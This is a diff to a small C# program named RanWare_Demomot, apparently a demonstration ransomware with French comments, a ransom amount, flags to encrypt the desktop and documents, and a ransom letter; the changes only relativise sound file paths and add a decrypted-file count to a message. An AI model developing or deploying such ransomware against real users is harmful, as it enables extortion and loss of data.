@@ -22,8 +22,8 @@ namespace RanWare_Demomot
         double amount = 1.5;//Montant de la rançon
 
         Random randomPos = new Random();//Position random du bouton "Stop the muisc"
-        SoundPlayer nyanPlayer = new SoundPlayer(@"C:\Safe_Folder\RanWare_Demomot\RanWare_Demomot\Sound\Nyan.wav");//Son nyan
-        SoundPlayer poneyPlayer = new SoundPlayer(@"C:\Safe_Folder\RanWare_Demomot\RanWare_Demomot\Sound\poney.wav");//Son poney
+        SoundPlayer nyanPlayer = new SoundPlayer(@"Sound/Nyan.wav");//Son nyan
+        SoundPlayer poneyPlayer = new SoundPlayer(@"Sound/poney.wav");//Son poney
         const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
         const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
         const bool ENCRYPT_DOCUMENTS = false;//Encrypte les documents
@@ -220,7 +220,7 @@ namespace RanWare_Demomot
                 }
                 isDecripted = true;
                 ransomLetter(filesName);
-                MessageBox.Show("Merci d'avoir fais affaire avec nous :)");
+                MessageBox.Show("Merci d'avoir fais affaire avec nous :)\n Nombre de fichiers decryptés : " + lblNbr.Text);
                 nyanPlayer.Stop();
                 poneyPlayer.Stop();
                 Application.Exit();
